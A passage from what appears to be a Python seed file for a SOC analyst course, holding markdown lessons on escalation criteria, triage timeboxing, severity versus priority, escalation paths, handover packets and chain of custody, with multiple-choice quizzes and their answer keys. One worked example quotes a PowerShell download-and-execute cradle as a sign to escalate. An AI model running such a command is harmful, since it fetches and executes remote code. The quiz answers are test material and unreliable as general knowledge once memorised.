> **Prerequisites.** Modules 1–6 (Alert Lifecycle, SIEM Fundamentals, Windows Event Logs, Network Telemetry, IOC Handling, Phishing Triage).

## Why escalation discipline matters

Every alert that reaches an L1 is, at its core, a question: *does this need someone else's attention, and if so, whose?* That answer — multiplied across thousands of alerts per shift, hundreds of analysts, dozens of teams — is the engine that determines whether a SOC functions or melts down. Escalation is not a side activity. It *is* L1 work.

A well-disciplined L1 understands two opposing failure modes:

### The cost of a false escalation

A false escalation is one where L1 hands work to L2, IR, or another team that L1 should have closed themselves. Each false escalation:

- **Burns L2 cycles.** L2 analysts are the most expensive seat in the SOC and, in most teams, the bottleneck. Every minute spent on a false-positive escalation is a minute *not* spent on a real intrusion already in dwell.
- **Erodes signal-to-noise on the L2 queue.** When L2 sees 70% noise from L1, they read the queue with skepticism. A real escalation buried in noise gets dismissed.
- **Produces alert fatigue downstream.** *Boy who cried wolf* is not a metaphor in a SOC — it is observable. After enough false escalations, L2 anchors low on severity and *misses* a genuine high-severity event.
- **Distorts KPIs.** Escalation rate is a managed metric. False escalations inflate it artificially, hiding real coverage gaps and making detection-engineering work look more successful than it is.
- **Demoralises the analyst.** L1s who escalate everything stop learning to triage. They become a routing function, not analysts. Career growth stalls.

### The cost of a missed escalation

A missed escalation is when L1 closes a ticket that should have moved up. Each one:

- **Delays containment.** If credential theft is misclassified as a benign sign-in, the attacker has another shift to move laterally. *Mean time to contain (MTTC)* is the metric most directly correlated with breach cost (Verizon DBIR; IBM *Cost of a Data Breach*).
- **Lengthens dwell time.** First-evidence-to-detection. Mandiant *M-Trends* and Verizon DBIR publish annual medians. A missed L1 escalation moves a clock the rest of the org cannot un-move.
- **Widens blast radius.** Another four hours of unimpeded access compromises more accounts, exfiltrates more data, places more persistence.
- **Starts the regulatory clock late.** GDPR Article 33's 72-hour clock starts when the controller *becomes aware* of a personal-data breach. If L1 missed it, "awareness" is whenever the customer / partner / press informs you instead — and the regulator now sees both an incident *and* a notification failure.
- **Becomes a board-level event.** Missed L1 escalations turning into public breaches are how SOCs lose trust internally, lose budget, and lose people.

### The chokepoint principle

L1 sits at the funnel's narrowest point. Bad escalation discipline degrades *everything* downstream — detection engineering, IR, threat intel, and even external relationships with regulators and CIRTs. Good discipline is a force multiplier: an L1 who escalates the right 5% and closes the rest with confidence is worth far more than one who escalates 30% indiscriminately.

The honest framing: *"I am not the last line of defence, but I am the first line of judgement."* L1 isn't expected to know everything. L1 *is* expected to recognise when a situation has moved beyond what they can confidently dispose of, and to package the work cleanly for whoever takes it next.

## The L1 decision: escalate / contain / close

Three terminal dispositions for any alert:

1. **Close** — false positive, benign true positive (BTP), known-good behaviour, duplicate, or out-of-scope.
2. **Contain-and-close** — true positive, but L1 has authority and the action is bounded; L1 takes the action, documents it, closes.
3. **Escalate** — beyond L1 authority, beyond L1 skill, or scope is too broad for L1 to bound.

### Default escalation criteria

If any of the following are present, escalate by default:

- **Confirmed credential exposure.** AiTM phishing kit harvest, token theft, password-spray success, OAuth illicit consent (Module 6).
- **EDR alert at *high* or above** — process injection, LSASS access, suspicious child-of-Office, ransomware behaviour, suspected lateral movement.
- **Lateral movement signals.** SMB / WMI / WinRM / RDP / PsExec / Impacket from a non-admin source. WinRM (port 5985/5986) from a workstation (Module 3).
- **Multiple users / multiple hosts affected.** Anything at scale exits the per-ticket frame and needs a coordinator.
- **VIP user.** Executives, board members, anyone in the privileged-user list.
- **Privileged-account activity outside change windows.** Domain admin sign-in from an unusual host, service account interactive logon (Logon Type 2 or 10), DCSync-like patterns.
- **Novel TTP** — something L1 has not seen before *and* cannot explain in a paragraph.
- **SLA risk** — L1 will not be able to dispose within tier SLA.
- **Cross-team action required** — OAuth grant revoke beyond L1's authority, account lock that requires Identity, system reimage that requires IT.
- **Suspected data exposure.** Personal data triggers GDPR; cardholder data triggers PCI; PHI triggers HIPAA.

### Contain-and-close criteria

Confidently close, with a documented disposition:

- Single-recipient phish blocked at gateway, never delivered.
- Phish delivered, *not* clicked (per URL telemetry), email purged, sender blocked.
- Confirmed FP on a known-noisy rule (with feedback flagged to detection engineering).
- Benign user behaviour matching a known pattern (developer running `psexec` in dev VLAN, sysadmin doing scripted maintenance during change window, security-team red-team exercise documented in calendar).
- Known-good admin-tool execution with corroborating evidence (ticket ID, change record, paired identity).
- Duplicate of an open higher-priority ticket (link, close as duplicate).

### "When in doubt, escalate" — but

The rule is a safety net, not a strategy. *If you would escalate every alert that produced uncertainty, your escalation rate becomes meaningless and your L2 stops trusting you.* The discipline is to *narrow* the doubt: pull one more log, check one more enrichment, ask one more question. **Then** decide.

### Worked examples

- *Alert: "Impossible travel — user signed in from London then Singapore in 8 minutes."* First check: corporate VPN egress map. If both IPs map to known VPN PoPs, this is benign. If one is a residential IP, this is escalate-grade (potential token theft).
- *Alert: "PowerShell encoded command on developer workstation."* First check: command-line decode. If it's `Get-AzContext` or developer tooling, BTP. If it's `IEX (New-Object Net.WebClient).DownloadString(...)`, escalate immediately.
- *Alert: "Outbound DNS to a newly-registered domain."* First check: enrichment age, popularity, related-IP reputation. CDN edge registered yesterday → BTP. Single host beaconing to an unranked domain every 60 s with low jitter → escalate (C2 candidate).

## Triage timeboxing

A SOC that does not timebox is a SOC that drifts. Timeboxing means *"I will spend at most N minutes on this disposition; if I can't decide by then, the inability to decide is itself the signal."*

### SLA tiers and escalation triggers

Typical L1 SLA bands (these vary; ION's defaults are sane):

| Severity | Triage start | First-action SLA | Disposition target |
|---|---|---|---|
| **P1 / Critical** | ≤ 5 min | ≤ 15 min | ≤ 1 hour or escalate |
| **P2 / High** | ≤ 15 min | ≤ 30 min | ≤ 4 hours or escalate |
| **P3 / Medium** | ≤ 30 min | ≤ 1 hour | ≤ 8 hours or backlog |
| **P4 / Low** | ≤ 4 hours | best-effort | next business day |

A *slipping SLA is itself an escalation trigger.* Started a P1 forty minutes ago and still don't have a verdict? You don't keep working — you escalate. The SLA exists to enforce this discipline.

### The 80/20 of L1 disposition

Empirically, ~80% of L1 alerts dispose within 15 minutes (BTPs, dedupes, simple FPs). ~15% take 15–60 minutes (need enrichment / a check). ~5% are genuine escalations. If your distribution is more like 50/40/10, you are either being overrun by noisy detections (a Detection-Engineering signal) or escalating when you shouldn't be.

### Stuck — escalate vs research

Two different stuck states demand different responses:

- **Stuck because of authority** (you don't have permission to revoke an OAuth grant) → escalate. The blocker is structural; more time won't change it.
- **Stuck because of skill / context** (you don't know how to read a certain log) → 15 more minutes of research, then escalate if still stuck. The blocker is knowledge; modest time may solve it.
- **Stuck because of scale** (more than one host or user; can't bound the scope) → escalate. L2/IR exists to coordinate scope.
- **Stuck because of novelty** (a TTP you've never seen) → 10 minutes of OSINT (CTI, ATT&CK, vendor blogs), then escalate or close. Don't try to become a threat researcher mid-shift.

### Heuristics

- *"Could I justify this disposition to my shift lead in two sentences?"* If not, escalate.
- *"If I close this and it turns out to be real, what will the post-incident review find?"* If "L1 had X evidence and missed Y signal," escalate.
- *"Am I closing this because I'm confident, or because I want my queue clean?"* If the second, escalate.

## The escalation decision tree

```mermaid
flowchart TD
    A[Alert received] --> B{Confirmed FP?}
    B -- yes --> Z1[Close as FP +<br/>tune ticket if recurring]
    B -- no --> C{Confirmed BTP?}
    C -- yes --> Z2[Close as BTP]
    C -- no --> D{Within L1<br/>authority?}
    D -- no --> E[Escalate]
    D -- yes --> F{Scope bounded<br/>to 1 user / 1 host?}
    F -- no --> E
    F -- yes --> G{Regulated data /<br/>VIP / Tier-0?}
    G -- yes --> E
    G -- no --> H{Can dispose<br/>within SLA?}
    H -- no --> E
    H -- yes --> I[Contain + close]
    E --> J[Build handover packet]
```

## Glossary

- **FP / BTP / TP** — false positive / benign true positive / true positive.
- **MTTC / dwell time** — mean time to contain / first-evidence to detection.
- **SLA tier as trigger** — slipping past the SLA *is* an escalation signal, not a measurement-only artefact.
- **Stuck-authority vs stuck-skill** — different stuck states demand different responses (escalate immediately vs research for a bounded window).

## Further reading

- Verizon DBIR — annual *Data Breach Investigations Report*.
- Mandiant *M-Trends* — annual dwell-time medians by region.
- IBM *Cost of a Data Breach Report*.
- NIST SP 800-61 Rev. 2 — *Computer Security Incident Handling Guide.*
""",
    )
    m7l1q = _add_lesson(
        session, mod7, order=2, title="Decision & timeboxing — quiz",
        lesson_type=LessonType.QUIZ, duration_min=7,
        content_md="Three questions on contain-vs-escalate criteria, SLA tiers as triggers, and the cost of false vs missed escalation.",
    )
    _add_q(session, m7l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An EDR alert fires for suspicious behaviour on a Tier-0 domain controller. The L1 has investigated for 25 minutes, the P2 disposition SLA is 4 hours, and they remain genuinely uncertain whether this is a malicious chain or a benign admin tool. What is the best next action?",
        options=[
            {"value": "research", "label": "Continue researching for up to 4 hours within the SLA"},
            {"value": "fp", "label": "Close as suspected FP and submit a tuning request to detection engineering"},
            {"value": "escalate", "label": "Escalate to L2 now with a partial handover packet"},
            {"value": "reassign", "label": "Reassign to the overnight shift to give them a head start"},
        ],
        correct="escalate",
        explanation_md="Tier-0 asset criticality plus genuine uncertainty after 25 minutes means the asset class itself drives the decision: escalate now. Continuing for another 3+ hours on a DC alert is not heroism; closing as FP is unsafe; reassigning passes the parcel.",
        points=2,
    )
    _add_q(session, m7l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are valid *contain-and-close* dispositions at L1, vs ones that should escalate?",
        options=[
            {"value": "blocked", "label": "Single-recipient phishing email blocked at the gateway and never delivered"},
            {"value": "fp_known", "label": "Confirmed FP on a known-noisy rule, with a tuning ticket opened"},
            {"value": "wmi_lat", "label": "Lateral-movement WMI from a workstation to an unrelated server"},
            {"value": "admin_change", "label": "Admin-tool execution paired with an open change record and approved ticket"},
            {"value": "afterhours_da", "label": "Domain Admin sign-in from an unusual host outside any change window"},
        ],
        correct=["blocked", "fp_known", "admin_change"],
        explanation_md="Blocked phish, confirmed FPs (with tuning), and admin tool runs that have a change record are all defensible L1 closures. Lateral-movement WMI from a workstation and out-of-window DA sign-ins are escalate-by-default — both are textbook lateral-movement / privilege-abuse signals.",
        points=3,
    )
    _add_q(session, m7l1q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="A slipping SLA is an administrative reporting metric only — analysts should keep working through it as long as they are making progress on the investigation.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** The SLA is the discipline mechanism, not the report. Crossing it without a verdict *is* the signal to escalate; the inability to decide within the timebox is itself information that the next tier needs to see.",
        points=2,
    )

    # Lesson 7.2 — Severity + priority + escalation paths
    m7l2 = _add_lesson(
        session, mod7, order=3,
        title="Severity, priority, blast radius, and the escalation paths",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Speak the language of standard severity and incident-classification frameworks (FIRST, ENISA, NIST 800-61r2, MITRE D3FEND/RE&CT)
> 2. Translate a severity into a *priority* using asset criticality, scope, time-of-day, and regulatory exposure
> 3. Articulate a *blast radius* — hosts × users × data classifications × services × external entities
> 4. Identify the right escalation path for an incident and know each path's *who / when / how / what / why*
> 5. Distinguish escalation paths that *L1 owns* from paths *L1 only triggers* (Comms, Regulators, Law Enforcement)

## Severity scales

L1s rarely *set* organisational severity from scratch — most SOCs inherit it from rule severity / SIEM scoring — but L1s constantly *propose adjustments* in handovers. Knowing the frameworks lets you speak the language of the people you're escalating to.

The most common SOC scale is five-tier:

| Severity | Common meaning |
|---|---|
| **Critical** | Confirmed business-impacting incident; widespread compromise or imminent data loss |
| **High** | Confirmed compromise of a single sensitive asset, or strong likelihood of widespread |
| **Medium** | Suspected compromise; investigation underway |
| **Low** | Possible compromise or low-impact policy violation |
| **Informational** | Logged for awareness; no action required |

### The frameworks worth knowing by name

- **FIRST CSIRT Services Framework v2.1** — industry-standard taxonomy of CSIRT services and incident handling. Source for many SOC severity conventions.
- **CVSS** (FIRST, v3.1 / v4.0) — vulnerability score, but its lens (Confidentiality × Integrity × Availability impact, weighted by attack vector and complexity) adapts well: incident severity ≈ *impact-on-CIA × asset-criticality × likelihood-of-realisation × scope*.
- **ENISA Reference Incident Classification Taxonomy** — used heavily across EU CSIRTs. Categories: abusive content, malicious code, information gathering, intrusion attempts, intrusions, availability, information content security, fraud, vulnerable, other.
- **NIST SP 800-61 Rev. 2** — *Computer Security Incident Handling Guide.* Categories: Denial of Service, Malicious Code, Unauthorized Access, Inappropriate Usage, Multiple Component, Other. Functional impact / information impact / recoverability are graded separately and combined.
- **MITRE D3FEND** and **ATC RE&CT** — defensive techniques and response actions. They don't drive severity directly, but they're the vocabulary L2 / IR use to describe response. Recognise the names.

## Priority = severity × business context

**Severity** answers *"how bad is this kind of incident?"* **Priority** answers *"how bad is this incident, on this asset, to this business, right now?"*

Inputs to priority:

- **Asset criticality.** A CRM sales workstation versus the domain controller versus the CEO's laptop are not the same asset, even when the alert text is identical.
- **Time of day / shift.** P2 at 09:00 Tuesday is a very different operational picture than P2 at 03:00 Sunday, when on-call must be paged.
- **Scope.** One user vs 50 users vs all users.
- **Regulatory exposure.** Regulated data class touched; jurisdiction; sectoral regime (PCI / HIPAA / NIS2 / DORA).
- **Concurrent incident posture.** If three other P1s are open, a borderline P3 may need escalation purely for awareness.

### Worked priority matrix

| Severity ↓ \\ Asset → | Workstation | Server | DC / Tier-0 | VIP / Regulated |
| ---- | ---- | ---- | ---- | ---- |
| **Critical** | P1 | P1 | P1 | P1 |
| **High** | P2 | P1 | P1 | P1 |
| **Medium** | P3 | P2 | P1 | P1 |
| **Low** | P4 | P3 | P2 | P2 |

Use it as a *sanity check.* If your alert is on a Tier-0 host and you classified it Medium-P3, you're miscalibrated.

## The blast-radius lens

Beyond severity, articulate a blast radius:

- **Hosts** affected (count + criticality)
- **Users** affected (count + privilege level)
- **Data classifications** touched (Public / Internal / Confidential / Restricted; PII / PHI / PCI / IP)
- **Services** touched (customer-facing? internal-only?)
- **External entities** touched (partner orgs, customers, vendors)

Blast radius is what L2 / IR cares about most when reading an L1 escalation.

## TLP marking on every handoff

Revisit Module 5. Every escalation handoff carries a **TLP** marking — TLP:RED, TLP:AMBER+STRICT, TLP:AMBER, TLP:GREEN, TLP:CLEAR (FIRST TLP 2.0, 2022). Many escalations also carry **PAP** markings, which limit the recipient's permitted action with the indicator. Mismarking is itself an incident in some regulated contexts.

## The escalation paths

L1 sits at the centre of a routing topology. Each path has *who, when, how, what, why.* You'll use 2–3 daily but should know all of them.

```mermaid
flowchart TD
    L1((L1<br/>analyst))
    L1 --> L2[L2 SOC]
    L1 --> IR[IR / DFIR]
    L1 --> TI[Threat Intel]
    L1 --> DE[Detection Eng / TIDE]
    L1 --> IT[IT / Helpdesk]
    L1 --> ID[Identity / IAM]
    L1 --> LG[Legal / Privacy]
    L1 --> HR[HR-Sec liaison]
    L1 --> CM[Comms / PR]
    L1 --> MG[Management / CISO]
    L1 --> VN[MSSP / Vendors]
    L1 --> CT[CIRT / CERT]
    L1 --> RG[Regulators]
    L1 --> LE[Law enforcement]
```

### L1 → L2 (the most common)

- **Why:** investigation requires deeper toolset, longer time, or specialist skill.
- **When:** any default-escalate criterion + L1 cannot bound scope or take terminal action.
- **How:** in-platform case escalation (ION case status `open → escalated`). Slack / Teams ping if P1.
- **What:** full handover packet (Lesson 7.5).
- **SLA:** L2 acknowledges within 15 min for P1, 1 hr for P2, 4 hr for P3.

### L1 → IR / DFIR (incident declared)

- **Why:** escalation has crossed from *investigate alert* into *manage incident lifecycle.* Multiple workstreams now needed: containment, eradication, recovery, comms, evidence, lessons-learned.
- **When:** confirmed compromise of a Tier-0 asset, mass user impact, regulator clock starts, business-impact threshold crossed (loss-of-service, data exposure).
- **How:** formal *incident declaration* — paging, war-room creation, comms cadence start, exec-loop opened.
- **What:** L2 packet plus a *declared incident scope* statement and an Incident Commander assignment.

### L1 → Threat Intel

- **Why:** novel campaign indicators that the org's CTI team should track / pivot on; or you need enrichment beyond standard tooling.
- **When:** new TTP, new infrastructure cluster, new lure family.
- **How:** CTI ticket / Slack channel / TIP submission. ION's CTI integrations (OpenCTI, MISP) accept structured submissions.
- **What:** indicators with TLP/PAP, a one-paragraph narrative, links to source artefacts.

### L1 → Detection Engineering / TIDE

- **Why:** the rule that fired is broken (FP-rich), missing (you saw something the rule didn't catch), or needs tuning.
- **When:** any FP-close from a rule with ≥ N FPs this week (often N=3); any time you manually find a pattern that should have alerted.
- **How:** detection-tuning ticket / TIDE rule-feedback / ION's tuning-proposal mechanism. *Separate channel from L2 escalation.* Tuning is engineering work; investigation is L2 work; don't mix them.
- **What:** rule ID, observed pattern, suggested logic change, sample events.

### L1 → IT / Ops / Helpdesk

- **Why:** non-security action required — reboot, reimage, rebuild, patch, hardware swap.
- **When:** L1 has decided containment requires IT-only action. Coordinate with L2 first if escalation pending.
- **How:** ITSM ticket (ServiceNow / Jira / Zendesk) with security-incident link.
- **What:** action, asset, deadline, risk-acceptance / change-management implications.

### L1 → Identity / IAM team

- **Why:** OAuth-grant revocation, conditional-access change, MFA reset, privileged-access-review trigger, federation issue.
- **When:** confirmed token theft (revoke active sessions + refresh tokens), confirmed illicit OAuth consent (revoke grant + audit app), suspected federation abuse.
- **How:** IAM ticket / on-call IAM page (P1 in working hours; P1 + page after-hours).
- **What:** affected user, affected app/grant ID, action requested, justification, approval thread.

### L1 → Legal / Compliance / Privacy

- **Why:** regulatory or contractual notification may be required; legal hold may need to be triggered; counsel may need to lead external communications.
- **When:** confirmed exposure of personal / regulated / customer data; potential law-enforcement involvement; potential litigation hold.
- **How:** privacy / legal escalation channel — typically Legal-IR liaison, with a high bar (don't spam Legal with maybes).
- **What:** facts as known, data classes touched, jurisdictions involved, **time of awareness**, current containment status. *Especially time of awareness* — it drives the GDPR / NIS2 clock.

### L1 → HR

- **Why:** confirmed insider threat, policy violation, suspected employee compromise where personnel action is in scope.
- **When:** insider data exfil suspected; shared-credentials-with-external; willful policy violation; suspected coercion / account-sale.
- **How:** **HR-Security liaison** (most orgs have one). *Never* L1 directly to a line HR rep.
- **What:** factual evidence only — *no speculation about employee motive.* Chain of custody matters here.

### L1 → Comms / PR

- **Why:** the incident is likely to surface publicly.
- **When:** *typically not L1's call.* Comms is engaged by IR or management. L1's job is to flag the *possibility* up the chain so Comms can be pre-positioned.
- **How:** via IR / management.
- **What:** scope, scale, sensitivity — Comms cares about reach and narrative, not technical detail.

### L1 → Management / CISO

- **Why:** policy threshold crossed, exec-stakeholder notification due, decision authority required (ransom, takedown, regulator engagement).
- **When:** P1 declared, regulator clock started, financial-impact threshold, board-level asset compromised.
- **How:** typically through shift lead → SOC manager → CISO chain. Page paths differ by org.
- **What:** the **3-line update** (Lesson 7.5) plus the full ticket link.

### L1 → MSSP / vendor support

- **Why:** vendor product is the source of truth (CrowdStrike, SentinelOne, Microsoft, Mandiant) and you need their telemetry, expertise, or escalation.
- **When:** vendor-detected campaign, suspected vendor-tooling false-positive, need for vendor IR support, suspected zero-day in a vendor product.
- **How:** vendor support portal + account team. Some products have integrated escalation (e.g., CrowdStrike Falcon Complete).
- **What:** their case ID, your ticket ID, full triage so far. Vendors hate being asked to start from zero.

### L1 → External CIRT / CERT, ISACs, regulators, law enforcement

These four paths are *typically not L1-initiated.* L1 should know they exist and which jurisdictions / regimes they cover. Lesson 7.7 covers them in detail (timed clocks, reporting portals, ISAC list).

## Glossary

- **Severity vs priority** — kind-of-incident vs this-incident-on-this-asset-right-now.
- **Blast radius** — hosts × users × data class × services × external entities.
- **TLP / PAP** — sharing-rule + permitted-action markings carried on every escalation handoff.
- **Path L1 owns vs path L1 triggers** — L2 / Identity / IT / DE are L1-driven; Comms / Regulators / Law Enforcement are L1-flagged but driven by IR / Legal / CISO.

## Further reading

- FIRST CSIRT Services Framework v2.1.
- NIST SP 800-61r2 §3.2 incident category definitions.
- ENISA Reference Incident Classification Taxonomy.
- FIRST TLP 2.0.
""",
    )
    m7l2q = _add_lesson(
        session, mod7, order=4, title="Severity, priority, paths — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on framework recognition, severity-vs-priority distinction, blast-radius reasoning, and selecting the right escalation path.",
    )
    _add_q(session, m7l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Which of the following best describes the *difference* between **severity** and **priority** in SOC incident handling?",
        options=[
            {"value": "synonyms", "label": "They are synonyms; both rate how bad the incident is"},
            {"value": "sev_pri", "label": "Severity describes how bad the kind of incident is in general; priority combines that with asset criticality, scope, time, and regulatory exposure to rank this specific incident"},
            {"value": "vendor", "label": "Severity is the vendor's score; priority is the analyst's score"},
            {"value": "rules", "label": "Severity is set by detection rules; priority is set by management"},
        ],
        correct="sev_pri",
        explanation_md="Severity is generic — *how bad is this kind of incident*. Priority is contextual — *how bad is this incident, on this asset, to this business, right now*, accounting for asset criticality, scope, regulatory exposure, and concurrent incident posture.",
        points=2,
    )
    _add_q(session, m7l2q, order=2, kind=QuestionKind.MULTI,
        stem_md="A confirmed AiTM token-theft incident is detected on the CFO's laptop. The CFO has access to pre-announcement financial data and the company is a US-listed public registrant. Which of the following are *correct* escalation paths the L1 should engage at this stage?",
        options=[
            {"value": "l2", "label": "L2 SOC for forensics"},
            {"value": "identity", "label": "Identity team for session and refresh-token revocation"},
            {"value": "legal", "label": "Legal — recording time of awareness and assessing materiality / GDPR / SEC 8-K disclosure trigger"},
            {"value": "comms_direct", "label": "Comms / PR — directly drafting a public statement"},
            {"value": "le_direct", "label": "Law enforcement — calling FBI directly to seize the attacker IP"},
        ],
        correct=["l2", "identity", "legal"],
        explanation_md="L2 + Identity + Legal are within L1's escalation flow at this stage. Comms is engaged by IR or management once the materiality / public-disclosure call is made — not L1's call. Law enforcement contact is a Legal/CISO-led decision, never an L1 unilateral action.",
        points=3,
    )
    _add_q(session, m7l2q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An L1 closes a phishing alert as a false positive. The same rule has now produced **four** FP-closes this week. Which escalation path is appropriate, in addition to closing the ticket?",
        options=[
            {"value": "l2", "label": "Escalate the closed FP to L2 for review"},
            {"value": "ir", "label": "Open an IR incident — multiple FPs are a coordination problem"},
            {"value": "de", "label": "Open a Detection Engineering / TIDE tuning ticket on the rule"},
            {"value": "ti", "label": "Submit the indicator to the threat-intel team"},
        ],
        correct="de",
        explanation_md="Recurring FPs are a *rule-tuning* signal, not an investigation signal. Detection Engineering / TIDE owns the fix. Sending it to L2 burns expensive capacity; sending it to IR is wildly out of scope; TI is for novel-indicator handoff, not rule noise.",
        points=2,
    )
    _add_q(session, m7l2q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="When escalating an indicator marked TLP:AMBER+STRICT, an L1 may share it on the SOC's general Slack channel as long as no external parties are present.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** TLP:AMBER+STRICT confines sharing to the immediate org *and* to need-to-know — not the SOC's general channel. The whole-team Slack typically exceeds need-to-know; mismarking by widening sharing is itself a TLP violation.",
        points=2,
    )

    # Lesson 7.3 — Handover packet, chain of custody, comms discipline
    m7l3 = _add_lesson(
        session, mod7, order=5,
        title="The handover packet, chain of custody, and communication discipline",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Build a complete handover packet — title, header, affected entities, timeline, IOCs, containment actions, hypothesis, artefacts, open questions, recommended next steps, stakeholder log
> 2. Distinguish a 5-line escalation from a 5-page escalation, and know which is appropriate for which kind of work
> 3. Apply the irreducible-minimum *five fields* every handover must include
> 4. Apply RFC 3227 *order of volatility* and the L1's chain-of-custody rules of thumb
> 5. Use the **3-line update** for execs and a status-update cadence appropriate to severity

## Anatomy of a good handover

This is the most practical part of escalation work — the artefact you produce every time you escalate. A good handover saves L2 thirty minutes; a bad one costs L2 ninety.

A complete handover packet:

```
TITLE
  [12-word incident summary, severity-leading]
  e.g. "P1 — Confirmed AiTM token theft, 1 user (HR-Director), session active"

HEADER
  Severity (current / proposed):     P1 / P1
  Classification (NIST 800-61):      Unauthorized Access
  TLP:                               TLP:AMBER
  Time of awareness (UTC):           2026-04-28T09:14:02Z
  Reporter:                          alice@soc (L1)
  Detection source:                  Defender for Cloud Apps - "Suspicious inbox forwarding"

AFFECTED ENTITIES
  Users:     hr-director@corp.example   (object_id: 5d0c...)
  Hosts:     LAPTOP-HRD01                (computer_name, EDR id)
  Accounts:  AAD primary + 2 secondary OAuth grants
  IPs:       198.51.100.42 (attacker, ASN-...), 203.0.113.7 (victim, corp egress)
  Mailboxes: hr-director@corp.example
  Apps:      Microsoft Graph "MailRead.All" grant by app id 71b5...

TIMELINE (UTC, monotonic)
  09:02:11  user.signin       hr-director from 198.51.100.42, MFA-satisfied (token replay suspected)
  09:02:14  inbox.rule.create "Move to RSS Subs" — pattern: subject CONTAINS "invoice"
  09:08:30  graph.token.use   MailRead.All from same IP
  09:11:55  alert.fired       DCA-1234 "Suspicious inbox forwarding"
  09:12:30  l1.assigned       alice
  09:14:02  l1.aware          alice opens case (TIME OF AWARENESS)
  09:18:40  l1.action         sign-ins audit pulled; 12 sessions in last 24h
  09:23:05  l1.action         inbox rule disabled (with L2 OK)
  09:24:00  l1.escalate       escalating to L2 + Identity

IOCS
  - 198.51.100.42 [ip-src] TLP:AMBER PAP:AMBER  (sighting: aad sign-in)
  - <token JTI>   [token]  TLP:RED   PAP:RED    (revoke pending Identity)
  - <app id>      [oauth]  TLP:AMBER PAP:AMBER  (grant: MailRead.All)
  - rule="Move to RSS Subs" + "invoice" [mailbox-rule] TLP:GREEN

CONTAINMENT ACTIONS TAKEN
  - 09:23:05  Inbox rule disabled (revertible; not deleted, kept for evidence)
  - 09:24:00  User notified by SOC duty manager (not by L1)
  - NOT TAKEN: token revoke (pending Identity); password reset (pending IT)

HYPOTHESIS
  AiTM token theft via reverse-proxy phish kit; attacker replayed session, set
  inbox rule for invoice fraud. Initial vector likely Tycoon/EvilProxy class
  based on TTP. Confidence: medium-high.

ARTEFACTS (hashed, attached)
  - signin_export_2026-04-28_0914Z.csv  sha256:7a3f...
  - inbox_rules_pre_disable.json        sha256:4e2c...
  - graph_audit_24h.json                sha256:9b81...
  - email_screenshot_phish_lure.png     sha256:c0f1...

OPEN QUESTIONS
  - Did the attacker exfiltrate from the mailbox? (need full Graph export — L2)
  - Are other users in same campaign? (need TI pivot on attacker IP — TI)
  - Is HR-Director's laptop compromised, or was the theft pure web? (need EDR — L2)

RECOMMENDED NEXT STEPS
  1. Identity: revoke all sessions + refresh tokens for hr-director; revoke OAuth grant
  2. L2: full M365 ediscovery on mailbox last 24h; pivot on IP / token
  3. IT: forced password reset post-revoke
  4. Legal: this user has PII access — preserve and assess GDPR Art.33 trigger

STAKEHOLDER LOG
  09:24  SOC duty manager notified (Slack #soc-shift)
  09:25  L2 paged (PagerDuty)
  09:26  Identity on-call paged (PagerDuty)
  Legal: NOT YET notified — proposing notification by 09:45 if data-touch confirmed
```

```mermaid
flowchart LR
    H[Handover packet] --> T[Title + severity]
    H --> M[Metadata<br/>TLP / time-of-awareness]
    H --> E[Affected entities]
    H --> TL[Timeline UTC]
    H --> I[IOCs + TLP/PAP]
    H --> A[Containment actions]
    H --> Hy[Hypothesis]
    H --> Ar[Hashed artefacts]
    H --> O[Open questions]
    H --> R[Recommended next steps]
    H --> S[Stakeholder log]
```

## Anatomy of a *bad* handover

```
TITLE
  Phishing alert
BODY
  user got phished, sign-in from weird ip, escalating to L2
```

This is unfortunately common. Missing time of awareness, scope, IOCs, actions taken, hypothesis. L2 must redo all of L1's work.

## 5-line vs 5-page

A **5-line** escalation is appropriate for:

- A clearly bounded P3 / P4 where the next step is mechanical (*"rule X false-positive #4 this week, please tune"*).
- A handover to a team that already has full context (*"Identity, please revoke sessions for user X — full case in #incident-1234"*).

A **5-page** escalation is appropriate for:

- Any P1 / declared incident.
- Anything Legal / regulator-adjacent.
- Anything that crosses 2+ teams.

## The irreducible minimum

Even on a 5-line escalation, never leave out:

1. **Severity / proposed priority**
2. **Time of awareness (UTC)**
3. **Affected entity / scope**
4. **Action requested + why**
5. **Link to full evidence (case ID)**

## Chain of custody and evidence handling

L1 is not a forensic examiner. L1's role is *not to taint the chain.* Forensic discipline matters because some incidents end up in court, in regulatory inquiry, or in insurance claims — and evidence mishandled at the start cannot be salvaged later.

### Why it matters

- **Legal admissibility** — broken chain may be inadmissible.
- **Regulatory inquiry** — ICO, FTC, sectoral regulators may request evidence.
- **Criminal-referral preservation** — law enforcement requires defensible chain.
- **Insurance** — cyber insurers increasingly demand evidence preservation as a claims condition.

### Hash at collection

Every artefact pulled out of a system gets hashed *at collection time.* SHA-256 is the current default; SHA-1 / MD5 only as legacy corroboration, never alone. Hash + collection time + collector identity goes into the ticket adjacent to the artefact. This binds the artefact to its capture moment.

### Source-of-truth principle

Don't edit originals. Work on copies. If you must inspect a `.eml`, copy first; if you opened it in a viewer that may have triggered remote-content load (always for `.html` artefacts), record the fact in the timeline.

### RFC 3227 — order of volatility

Brezinski & Killalea, IETF, Feb 2002 — the canonical reference. Most volatile first:

1. Registers, cache
2. Routing table, ARP cache, process table, kernel statistics, **memory (RAM)**
3. Temporary file systems
4. Disk
5. Remote logging / monitoring data relevant to the system
6. Physical configuration, network topology
7. Archival media

The practical L1 translation: **don't shut down a host that L2 / IR may want to image live.** Powering off destroys RAM, where most modern malware actually lives (process injection, fileless, in-memory loaders).

### Time discipline

- All timestamps in **UTC. Always.** Local-time timestamps cause incident-reconstruction errors that take hours to untangle.
- All log sources NTP-synced. Record any known clock skew (*e.g.* `host A's clock is +12s ahead of UTC truth`).
- Monotonic timeline reconstruction: when two events share a timestamp, record collection order or sub-second precision.

